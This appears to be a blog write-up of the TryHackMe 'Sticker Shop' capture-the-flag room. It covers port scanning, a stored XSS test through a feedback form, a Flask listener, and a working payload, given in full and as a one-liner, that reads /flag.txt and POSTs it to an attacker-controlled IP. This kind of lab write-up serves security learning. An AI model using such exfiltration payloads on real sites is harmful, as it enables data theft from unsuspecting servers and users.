---
title: The Sticker Shop
date: 2024-11-30 14:00:00 +0200
categories:
  - TryHackMe
tags:
  - Web
  - XSS
description: Can you exploit the sticker shop in order to capture the flag?
render_with_liquid: false
media_subpath: /assets/img/thm_images/tryhackme_TheStickerShop
image:
  path: room.png
---
## Room
    
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** Sticker Shop
- **Name:** [The Sticker Shop](https://tryhackme.com/r/room/thestickershop)
- **Description:** Can you exploit the sticker shop in order to capture the flag?
- **Creator**: [toxicat0r](https://tryhackme.com/r/p/toxicat0r) 

### Flags

1. What is the content of flag.txt?

## Initial Recon

Let's start scanning for open ports.

```console
m3ga@kali:~$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.248.122

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
```

Didn't find anything too interesting so I started to enumerate the **webserver** on port **8080**.

From the task description, our objective is to read the `/flag.txt` file. However, we are unable to do so as we get a `401 Unauthorized`.

![](<Pasted image 20241130154528.png>){: w="500" h="300" .center }

Navigating to the homepage, we see the option to submit feedback!

![](<Pasted image 20241130154814.png>){: w="700" h="300" .center }

Based on the task description, I suspect that there is a XSS vulnerability. To test this, I set up a simple webserver and try to submit an XSS payload to call back to my server.

```shell
m3ga@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Here is that payload that I submitted.
```html
<script>var i = new Image(); i.src="http://10.11.75.248"</script>
```

![](<Pasted image 20241130155316.png>){: w="600" h="300" .center }

Almost immediately, I got a response.

![](<Pasted image 20241130155341.png>){: w="500" h="300" .center }

## Flag

To exploit this, we can easily craft a payload that fetches the content of `/flag.txt` and submits it to a server controlled by us.

Firstly, I have a simple web server that I use for these challenges. Here is the code:

```python
# server.py

from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        # Respond to preflight with appropriate headers
        response = jsonify(success=True)
        response.headers.add('Access-Control-Allow-Origin', '*')  # Allow any origin
        response.headers.add('Access-Control-Allow-Methods', 'POST')  # Allow only POST
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')  # Allow specific headers
        return response, 200
    elif request.method == 'POST':
        # Handle the actual POST request
        data = request.json.get('flag')
        print(f"Captured flag: {data}")
        return jsonify(success=True), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

To start the server, we simply do:
```console
m3ga@kali:$ python3 ./server.py
* Serving Flask app 'server'
* Debug mode: off
...
```

Once that's done, we will submit our payload which is this:
```html
<script>
  fetch('/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.11.75.248/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ flag: data })
      });
    });
</script>
```

and as a one-liner:
```html
<script>fetch('/flag.txt').then(r=>r.text()).then(d=>fetch('http://10.11.75.248/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({flag:d})}));</script>
```

After submitting this payload, we will get the flag.

![](<Pasted image 20241130160114.png>){: w="500" h="300" .center }

## Outro

Many thanks to the creator of this room, [toxicat0r](https://tryhackme.com/r/p/toxicat0r).

This room was one of the easiest challenges in a while for sure; still the feeling of completing the objective never gets old.

\- m3gakr4nus
